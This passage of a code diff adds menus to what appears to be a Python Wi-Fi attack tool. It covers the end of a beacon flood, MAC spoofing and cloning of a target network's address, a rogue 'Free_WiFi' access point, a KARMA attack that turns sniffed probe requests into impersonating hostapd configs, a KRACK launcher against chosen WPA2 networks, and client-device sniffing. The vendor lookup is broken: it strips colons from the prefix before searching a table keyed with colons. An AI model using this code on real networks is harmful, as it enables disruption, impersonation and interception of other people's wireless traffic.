+                        beacon = Dot11Beacon(cap="ESS+privacy")
+                        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+                        
+                        frame = RadioTap()/dot11/beacon/essid
+                        sendp(frame, iface=self.monitor_interface, verbose=False)
+                    
+                    if duration_left % 10 == 0:
+                        print(f"[*] {duration_left} seconds remaining...")
+                    time.sleep(1)
+                
+                print(f"{Fore.GREEN}[+] Beacon flood attack completed{Style.RESET_ALL}")
+                
+            except Exception as e:
+                print(f"{Fore.RED}[!] Beacon flood failed: {e}{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def mac_spoofing_menu(self):
+        """MAC address spoofing menu"""
+        if not self.interface:
+            print(f"{Fore.RED}[!] No interface selected{Style.RESET_ALL}")
+            return
+        
+        print(f"\n{Fore.CYAN}[*] MAC Address Spoofing Options:{Style.RESET_ALL}")
+        print("1. Random MAC address")
+        print("2. Specific vendor MAC")
+        print("3. Clone target MAC")
+        print("4. Restore original MAC")
+        
+        try:
+            choice = input(f"\n{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
+            
+            if choice == '1':
+                # Random MAC
+                new_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+                self.change_mac_address(new_mac)
+            
+            elif choice == '2':
+                # Vendor-specific MAC
+                vendors = {
+                    'apple': '00:1B:63',
+                    'samsung': '00:07:AB', 
+                    'intel': '00:1F:3C',
+                    'cisco': '00:0C:29',
+                    'netgear': '00:14:6C'
+                }
+                
+                print(f"\n{Fore.CYAN}[*] Available vendors:{Style.RESET_ALL}")
+                for vendor in vendors:
+                    print(f"  - {vendor}")
+                
+                vendor = input(f"\n{Fore.CYAN}[?] Select vendor: {Style.RESET_ALL}").lower()
+                if vendor in vendors:
+                    suffix = ":".join([f"{random.randint(0,255):02x}" for _ in range(3)])
+                    new_mac = f"{vendors[vendor]}:{suffix}"
+                    self.change_mac_address(new_mac)
+            
+            elif choice == '3':
+                # Clone target MAC
+                if self.target_networks:
+                    self.display_networks(self.target_networks)
+                    target_choice = int(input(f"\n{Fore.CYAN}[?] Select target to clone MAC: {Style.RESET_ALL}")) - 1
+                    if 0 <= target_choice < len(self.target_networks):
+                        target_mac = self.target_networks[target_choice]['bssid']
+                        self.change_mac_address(target_mac)
+                else:
+                    print(f"{Fore.RED}[!] No targets available{Style.RESET_ALL}")
+            
+            elif choice == '4':
+                # Restore original
+                self.restore_mac_address()
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def change_mac_address(self, new_mac):
+        """Change MAC address of interface"""
+        try:
+            print(f"{Fore.YELLOW}[*] Changing MAC address to {new_mac}...{Style.RESET_ALL}")
+            
+            if self.command_exists('macchanger'):
+                subprocess.run(['macchanger', '-m', new_mac, self.interface], 
+                              capture_output=True, timeout=10)
+            else:
+                # Manual method
+                subprocess.run(['ifconfig', self.interface, 'down'], timeout=10)
+                subprocess.run(['ifconfig', self.interface, 'hw', 'ether', new_mac], timeout=10)
+                subprocess.run(['ifconfig', self.interface, 'up'], timeout=10)
+            
+            print(f"{Fore.GREEN}[+] MAC address changed successfully{Style.RESET_ALL}")
+            
+        except Exception as e:
+            print(f"{Fore.RED}[!] MAC change failed: {e}{Style.RESET_ALL}")
+    
+    def restore_mac_address(self):
+        """Restore original MAC address"""
+        try:
+            print(f"{Fore.YELLOW}[*] Restoring original MAC address...{Style.RESET_ALL}")
+            
+            if self.command_exists('macchanger'):
+                subprocess.run(['macchanger', '-p', self.interface], 
+                              capture_output=True, timeout=10)
+            
+            print(f"{Fore.GREEN}[+] MAC address restored{Style.RESET_ALL}")
+            
+        except Exception as e:
+            print(f"{Fore.RED}[!] MAC restore failed: {e}{Style.RESET_ALL}")
+    
+    def rogue_ap_menu(self):
+        """Rogue access point menu"""
+        print(f"{Fore.YELLOW}[*] Setting up rogue access point...{Style.RESET_ALL}")
+        
+        ssid = input(f"{Fore.CYAN}[?] AP SSID (default 'Free_WiFi'): {Style.RESET_ALL}") or "Free_WiFi"
+        channel = input(f"{Fore.CYAN}[?] Channel (1-11, default 6): {Style.RESET_ALL}") or "6"
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        attack_dir = f"{self.results_dir}/attacks/rogue_ap_{timestamp}"
+        os.makedirs(attack_dir, exist_ok=True)
+        
+        # Create open AP config
+        hostapd_config = f"""interface={self.monitor_interface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+"""
+        
+        config_file = f"{attack_dir}/rogue_ap.conf"
+        with open(config_file, 'w') as f:
+            f.write(hostapd_config)
+        
+        print(f"{Fore.GREEN}[+] Rogue AP configuration created{Style.RESET_ALL}")
+        print(f"[*] Start with: hostapd {config_file}")
+    
+    def karma_attack_menu(self):
+        """KARMA attack menu"""
+        print(f"{Fore.YELLOW}[*] Setting up KARMA attack...{Style.RESET_ALL}")
+        
+        # Collect probe requests first
+        print(f"[*] Collecting probe requests...")
+        probe_requests = set()
+        
+        def probe_handler(packet):
+            if packet.haslayer(Dot11ProbeReq):
+                if packet[Dot11Elt] and packet[Dot11Elt].info:
+                    ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
+                    if ssid and ssid not in probe_requests:
+                        probe_requests.add(ssid)
+                        print(f"[+] Captured probe for: {ssid}")
+        
+        try:
+            print(f"[*] Listening for probe requests (30 seconds)...")
+            sniff(iface=self.monitor_interface, prn=probe_handler, timeout=30, store=False)
+            
+            if probe_requests:
+                print(f"\n{Fore.GREEN}[+] Captured {len(probe_requests)} unique SSIDs{Style.RESET_ALL}")
+                for ssid in sorted(probe_requests):
+                    print(f"  - {ssid}")
+                
+                # Create KARMA AP configs
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                attack_dir = f"{self.results_dir}/attacks/karma_{timestamp}"
+                os.makedirs(attack_dir, exist_ok=True)
+                
+                # Create multiple AP configs
+                for i, ssid in enumerate(list(probe_requests)[:5]):  # Limit to 5
+                    config = f"""interface={self.monitor_interface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={6 + (i % 5)}
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+"""
+                    with open(f"{attack_dir}/karma_{i}.conf", 'w') as f:
+                        f.write(config)
+                
+                print(f"{Fore.GREEN}[+] KARMA attack configurations created in {attack_dir}{Style.RESET_ALL}")
+            
+        except Exception as e:
+            print(f"{Fore.RED}[!] KARMA attack failed: {e}{Style.RESET_ALL}")
+    
+    def krack_attack_menu(self):
+        """KRACK attack menu (WPA2 vulnerability)"""
+        print(f"{Fore.YELLOW}[*] KRACK Attack - WPA2 Key Reinstallation{Style.RESET_ALL}")
+        print(f"{Fore.RED}[!] This attack exploits CVE-2017-13077 (KRACK vulnerability){Style.RESET_ALL}")
+        
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        # Filter WPA2 networks
+        wpa2_networks = [n for n in self.target_networks if 'WPA2' in n.get('privacy', '')]
+        
+        if not wpa2_networks:
+            print(f"{Fore.RED}[!] No WPA2 networks found{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(wpa2_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select WPA2 target: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(wpa2_networks):
+                target = wpa2_networks[choice]
+                
+                print(f"{Fore.YELLOW}[*] Attempting KRACK attack on {target['essid']}...{Style.RESET_ALL}")
+                print(f"[*] Monitoring for vulnerable handshakes...")
+                
+                # This would require a specialized KRACK tool like krackattacks-scripts
+                if self.command_exists('krack-test-client.py'):
+                    subprocess.run([
+                        'python3', 'krack-test-client.py',
+                        '--target', target['bssid'],
+                        '--interface', self.monitor_interface
+                    ], timeout=300, capture_output=True)
+                else:
+                    print(f"{Fore.RED}[!] KRACK testing tools not installed{Style.RESET_ALL}")
+                    print(f"[*] Install krackattacks-scripts for full KRACK testing")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def network_mapper_menu(self):
+        """Network mapping and topology discovery"""
+        print(f"{Fore.CYAN}[*] Network Mapping and Topology Discovery{Style.RESET_ALL}")
+        
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        # Analyze network relationships
+        print(f"[*] Analyzing network topology...")
+        
+        channel_map = {}
+        vendor_map = {}
+        
+        for network in self.target_networks:
+            channel = network.get('channel', 'Unknown')
+            bssid = network.get('bssid', '')
+            
+            # Group by channel
+            if channel not in channel_map:
+                channel_map[channel] = []
+            channel_map[channel].append(network)
+            
+            # Analyze vendor (OUI)
+            if bssid:
+                oui = bssid[:8].upper().replace(':', '')
+                vendor = self.lookup_vendor(oui)
+                if vendor not in vendor_map:
+                    vendor_map[vendor] = []
+                vendor_map[vendor].append(network)
+        
+        # Display channel utilization
+        print(f"\n{Fore.CYAN}[*] Channel Utilization:{Style.RESET_ALL}")
+        for channel, networks in sorted(channel_map.items()):
+            print(f"  Channel {channel}: {len(networks)} networks")
+            for net in networks[:3]:  # Show top 3
+                print(f"    - {net['essid']} ({net['bssid']})")
+        
+        # Display vendor analysis
+        print(f"\n{Fore.CYAN}[*] Vendor Analysis:{Style.RESET_ALL}")
+        for vendor, networks in sorted(vendor_map.items(), key=lambda x: len(x[1]), reverse=True)[:5]:
+            print(f"  {vendor}: {len(networks)} devices")
+        
+        # Save mapping results
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        mapping_file = f"{self.results_dir}/scans/network_map_{timestamp}.json"
+        
+        mapping_data = {
+            'timestamp': timestamp,
+            'channel_utilization': {k: len(v) for k, v in channel_map.items()},
+            'vendor_distribution': {k: len(v) for k, v in vendor_map.items()},
+            'total_networks': len(self.target_networks)
+        }
+        
+        with open(mapping_file, 'w') as f:
+            json.dump(mapping_data, f, indent=2)
+        
+        print(f"\n{Fore.GREEN}[+] Network mapping saved to {mapping_file}{Style.RESET_ALL}")
+    
+    def lookup_vendor(self, oui):
+        """Lookup vendor by OUI"""
+        # Basic vendor lookup (simplified)
+        vendor_db = {
+            '00:1B:63': 'Apple',
+            '00:07:AB': 'Samsung',
+            '00:1F:3C': 'Intel',
+            '00:0C:29': 'Cisco',
+            '00:14:6C': 'Netgear',
+            '00:1E:58': 'D-Link',
+            '00:26:BB': 'Linksys',
+            '00:23:69': 'TP-Link'
+        }
+        
+        return vendor_db.get(oui, 'Unknown')
+    
+    def client_monitoring_menu(self):
+        """Monitor and analyze connected clients"""
+        print(f"{Fore.CYAN}[*] Client Monitoring and Analysis{Style.RESET_ALL}")
+        
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] Please discover networks first{Style.RESET_ALL}")
+            return
+        
+        self.display_networks(self.target_networks)
+        
+        try:
+            choice = int(input(f"\n{Fore.CYAN}[?] Select network to monitor clients: {Style.RESET_ALL}")) - 1
+            if 0 <= choice < len(self.target_networks):
+                target = self.target_networks[choice]
+                duration = int(input(f"{Fore.CYAN}[?] Monitoring duration in seconds (default 60): {Style.RESET_ALL}") or "60")
+                
+                print(f"{Fore.YELLOW}[*] Monitoring clients for {target['essid']} for {duration} seconds...{Style.RESET_ALL}")
+                
+                clients = {}
+                
+                def client_handler(packet):
+                    if packet.haslayer(Dot11):
+                        # Check for data frames
+                        if packet.type == 2:  # Data frame
+                            src = packet.addr2
+                            dst = packet.addr1
+                            bssid = packet.addr3
+                            
+                            if bssid and bssid.lower() == target['bssid'].lower():
+                                if src != bssid and src not in clients:
+                                    clients[src] = {
+                                        'first_seen': datetime.now().isoformat(),
+                                        'packets': 0,
+                                        'vendor': self.lookup_vendor(src[:8].upper().replace(':', ''))
+                                    }
+                                    print(f"[+] New client: {src} ({clients[src]['vendor']})")
+                                
+                                if src in clients:
+                                    clients[src]['packets'] += 1
+                
+                try:
+                    sniff(iface=self.monitor_interface, prn=client_handler, timeout=duration, store=False)
+                    
+                    if clients:
+                        print(f"\n{Fore.GREEN}[+] Discovered {len(clients)} clients:{Style.RESET_ALL}")
+                        for mac, info in clients.items():
+                            print(f"  {mac} - {info['vendor']} ({info['packets']} packets)")
+                        
+                        # Save client data
+                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        client_file = f"{self.results_dir}/scans/clients_{timestamp}.json"
+                        
+                        client_data = {
+                            'target_network': target,
+                            'clients': clients,
+                            'timestamp': timestamp
+                        }
+                        
+                        with open(client_file, 'w') as f:
+                            json.dump(client_data, f, indent=2)
+                        
+                        print(f"[+] Client data saved to {client_file}")
+                    else:
+                        print(f"{Fore.YELLOW}[-] No clients detected{Style.RESET_ALL}")
+                
+                except Exception as e:
+                    print(f"{Fore.RED}[!] Client monitoring failed: {e}{Style.RESET_ALL}")
+        
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
 
     def cleanup_and_exit(self):
         """Cleanup and exit gracefully"""
